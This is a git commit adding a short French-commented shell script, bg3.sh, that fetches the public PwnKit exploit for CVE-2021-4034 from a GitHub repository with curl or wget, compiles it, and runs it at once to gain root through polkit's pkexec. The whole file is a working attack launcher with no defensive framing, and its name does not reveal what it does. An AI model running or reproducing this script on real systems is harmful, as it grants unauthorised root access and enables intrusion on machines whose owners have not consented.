83f5ac99bf1ac1ee1d8c10f55bcd5bfd832b3883
Spitzu <96686124+Spitzu@users.noreply.github.com>
2024-06-12 15:44:10 +0200

    Add files via upload

---
+++ bg3.sh
@@ -0,0 +1,26 @@
+#!/usr/bin/env sh
+
+URL='https://raw.githubusercontent.com/berdav/CVE-2021-4034/main'
+
+# Télécharger les fichiers nécessaires
+for EXPLOIT in "cve-2021-4034.c" "pwnkit.c" "Makefile"
+do
+    curl -sLO "${URL}/${EXPLOIT}" || wget --no-hsts -q "${URL}/${EXPLOIT}" -O "$EXPLOIT"
+done
+
+# Vérifier si les fichiers ont été téléchargés correctement
+if [ ! -f "cve-2021-4034.c" ] || [ ! -f "pwnkit.c" ] || [ ! -f "Makefile" ]; then
+    echo "Erreur: Échec du téléchargement d'un ou plusieurs fichiers."
+    exit 1
+fi
+
+# Compiler les fichiers
+make
+
+# Vérifier si la compilation a réussi
+if [ $? -eq 0 ]; then
+    ./cve-2021-4034
+else
+    echo "Erreur: La compilation a échoué."
+    exit 1
+fi
